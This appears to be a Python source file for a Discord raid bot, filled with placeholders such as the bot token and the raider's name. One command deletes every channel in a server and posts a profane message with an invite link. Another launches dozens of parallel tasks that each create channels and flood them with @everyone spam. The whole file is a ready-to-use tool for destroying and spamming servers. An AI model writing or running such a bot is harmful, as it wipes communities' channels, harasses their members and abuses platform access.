
import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=".", intents=intents)


TOKEN = "TOKEN-BOT-HERE"                                                
@bot.command()
async def nuke(ctx):
    tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*tasks)
    new_channel = await ctx.guild.create_text_channel("Cooked by YOUR-NAME")
    await new_channel.send("Fucked-by-YOUR-NAME https://discord.gg/SERVER-LINK")
    await ctx.send("Todos los canales fueron eliminados")

@bot.command()
async def on(ctx):
    async def create_channel(nombre, mensaje) :
        for _ in range(20): 
            try:
                new_channel = await ctx.guild.create_text_channel(f"{nombre}")
                for _ in range(mensaje):
                    await new_channel.send("@everyone Fucked by YOUR-NAME https://discord.gg/SERVER-LINK")
            except Exception as e:
                print(f"Error al crear los canales o enviar el mensaje: {e}")

    await asyncio.gather(*[create_channel("Raid-by-Astra", 20) for i in range(60)])
    

    
bot.run(TOKEN)
